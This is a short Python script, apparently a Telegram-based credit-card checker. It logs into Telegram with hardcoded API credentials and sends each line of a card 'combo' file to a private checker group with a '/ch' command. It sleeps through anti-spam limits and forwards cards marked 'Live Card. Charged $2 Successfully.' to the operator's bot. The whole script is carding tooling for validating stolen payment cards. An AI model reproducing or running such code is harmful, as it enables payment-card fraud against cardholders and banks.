import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
ch = "https://t.me/+kxscLvCqYstjYWZk"
api_id = '15629264'
api_hash = '4dc40d511869940a6a4042b87bbc652d'
ID = input('ENTER YOUR ID TELE :')
token= input('ENTER YOUR TOKEN BOT :')
combo = input('ENTER YOU COMBO NAME :')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/ch {cc}")
        time.sleep(random.randint(36,36))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            t = str(mssag[0].message).split("again after ")[1]
            t = t.split("seconds")[0]
            t = int(t)
            print(f"Done Sleep : {t+2}")
            time.sleep(t+1)
        print(mssag[0].message)
        ccr = mssag[0].message
        if 'Live Card. Charged $2 Successfully.' in ccr :
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=HI PRO NEW CC {ccr}"
            i = requests.post(tlg)
        time.sleep(1)
    except:
        print(False)